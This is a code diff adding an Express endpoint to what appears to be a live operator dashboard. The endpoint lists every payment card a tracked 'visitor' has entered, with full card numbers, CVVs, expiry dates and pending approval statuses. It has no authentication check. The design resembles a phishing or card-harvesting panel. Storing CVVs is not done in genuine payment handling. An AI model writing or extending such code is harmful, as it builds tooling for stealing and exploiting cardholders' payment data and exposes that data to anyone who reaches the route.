@@ -652,6 +652,69 @@ async function startServer() {
     io.emit(event, data);
   }
 
+  // =============================================
+  // Get Card History for a Visitor
+  // =============================================
+  app.get("/api/dashboard/card-history/:visitorId", async (req, res) => {
+    try {
+      const { visitorId } = req.params;
+      const visitor = await readVisitor(visitorId);
+      
+      if (!visitor) {
+        res.status(404).json({ error: "Visitor not found", cards: [] });
+        return;
+      }
+
+      // Get all card entries from raw data
+      const cards: any[] = [];
+      
+      // Get main card data from current visitor
+      if (visitor.raw?.cardNumber) {
+        cards.push({
+          cardNumber: visitor.raw.cardNumber,
+          cardHolder: visitor.raw.cardHolder || visitor.raw.name || "",
+          expiryDate: visitor.raw.expiryDate || visitor.raw.cardExpiry || "",
+          cvv: visitor.raw.cvv || "",
+          cardType: visitor.raw.cardType || "",
+          status: visitor.raw._v1Status || "pending",
+          totalPrice: visitor.raw.offerTotalPrice || visitor.raw.totalPrice || 0,
+          updatedAt: visitor.raw.cardUpdatedAt || visitor.raw.updatedAt || visitor.updatedAt,
+          isCurrent: true
+        });
+      }
+
+      // Get historical card entries from rawData array (if exists)
+      const rawData = visitor.rawData || [];
+      for (const entry of rawData) {
+        if (entry?.raw?.cardNumber && entry.raw.cardNumber !== visitor.raw?.cardNumber) {
+          // Check if this card is not already in the list
+          const exists = cards.some(c => c.cardNumber === entry.raw.cardNumber);
+          if (!exists) {
+            cards.push({
+              cardNumber: entry.raw.cardNumber,
+              cardHolder: entry.raw.cardHolder || entry.raw.name || "",
+              expiryDate: entry.raw.expiryDate || entry.raw.cardExpiry || "",
+              cvv: entry.raw.cvv || "",
+              cardType: entry.raw.cardType || "",
+              status: entry.raw._v1Status || "pending",
+              totalPrice: entry.raw.offerTotalPrice || entry.raw.totalPrice || 0,
+              updatedAt: entry.raw.cardUpdatedAt || entry.raw.updatedAt || entry.updatedAt,
+              isCurrent: false
+            });
+          }
+        }
+      }
+
+      // Sort by updatedAt descending
+      cards.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
+
+      res.json({ cards, visitorId });
+    } catch (error) {
+      console.error("Error fetching card history:", error);
+      res.status(500).json({ error: "Failed to fetch card history", cards: [] });
+    }
+  });
+
   // SSE endpoint for customer pages (one-way from server to customer)
   app.get("/api/dashboard/stream", (_req, res) => {
     res.setHeader("Content-Type", "text/event-stream");
